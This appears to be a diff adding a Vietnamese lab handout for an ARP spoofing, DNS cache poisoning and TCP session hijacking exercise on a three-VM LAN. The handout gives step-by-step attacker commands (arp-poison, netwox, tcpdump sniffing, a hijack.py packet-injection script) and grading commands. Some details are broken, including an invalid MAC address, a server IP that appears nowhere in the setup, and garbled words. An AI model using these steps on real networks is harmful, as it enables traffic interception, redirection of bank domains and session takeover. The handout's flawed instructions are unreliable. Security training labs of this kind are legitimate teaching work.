@@ -1,0 +1,79 @@
+BAI LAB: ARP-LEVEL DNS POISONING + TCP HIJACKING
+==========================================
+
+BOI CANH
+--------
+He thong gom 3 may ao tren cung mot mang LAN (192.168.0.0/24):
+
+  - user   (192.168.0.100): may nan nhan, chuong trinh duy nhat, mo phien TCP.
+  - apollo-dns (192.168.0.10): may chu DNS BIND9, chua cache DNS.
+  - attacker (192.168.0.200): may cua ke tan cong (ban), co san scapy,
+    tcpdump, netwox va script arp-poison.
+
+NHIEM VU CUA BAN (muc do TRUNG BINH)
+-------------------------------------
+
+Buoc 1. Tren attacker, thuc hien ARP spoofing de giua user va apollo-dns:
+  
+      cd ~/.local/bin
+      sudo nohup ./arp-poison eth0 >/tmp/arp.log 2>&1 < /dev/null &
+      disown
+  
+  Kiem tra tren user: ip neigh | grep 192.168.0.10 phai thay dia chi
+  192.168.0.10 tro toi MAC cua attacker (02:42:c0:a8:00:c8).
+
+Buoc 2. Tren attacker, cau hong cache DNS Apollo:
+  
+      netwox 80 -e 02:42:c0:a8:00:c8 -i 192.168.0.10 -E 02:42:c0:a8:00:200 -I 192.168.0.100 -s 500
+      nohup netwox 80 ... >/tmp/n80.log 2>&1 &
+  
+  Kiem tra tren apollo-dns: sudo rndc flush. Sau do:
+      dig @192.168.0.10 www.chase.com +short
+  Phai tra ve: 10.99.0.99
+
+Buoc 3. Tren user, mo phien TCP toi server (theo doi huong DNS gia mao):
+  
+      start-session
+  
+  Kiem tra tren server: sudo cat /var/log/session.log phai thay HELLO.
+
+Buoc 4. Tren attacker, dung tcpdump de sniff goi tin:
+  
+      sudo tcpdump -Z root -U -n -w ~/session.pcap 'tcp port 9999'
+  
+  De cua so chay, tren user gui them du lieu: echo PROBE | nc -w 3 192.168.0.3 9999
+
+  De doc capture (Ctrl+C truoc hoac mo terminal khac):
+      sudo tcpdump -nn -r ~/session.pcap
+  
+  Tim so sau:
+    - SEQ next cua user: lay tu goi SYN seq + 1 + do dai payload
+    - ACK cua server: SYN-ACK seq + 1 + 10
+    - sport: cordon nguon cua user
+
+Buoc 5. Tren attacker, chen goi tin gia mao vao phien TCP:
+  
+      sudo python3 hijack.py <seq> <ack> <sport>
+  
+  Vi du: sudo python3 hijack.py 2452713155 4262428 48844
+
+  Kiem tra tren server: sudo cat /var/log/session.log phai chua HIJACKED.
+
+KIEM TRA KET QUA
+----------------
+Tu Linux host, chay lenh:
+
+    checkwork
+
+De xem 4 checkwork: cw_arp_spoof, cw_dns_poison, cw_tcp_session, cw_tcp_hijacked.
+
+KET THUC
+--------
+Khi hoan thanh, chay:
+
+    stoplab
+
+LUA CHON THU TU THUC HANH:
+1. Phao yen: arp-poison -> cache DNS poison -> start-session -> sniff -> chen goi tin
+2. Tat pkill hoac dong terminal giua trinhieng, vi viec capture va chen phai dam bao ket noi con tro.
+3. Dung tcpdump kèm cflag -U de ghi file pcap that luc.
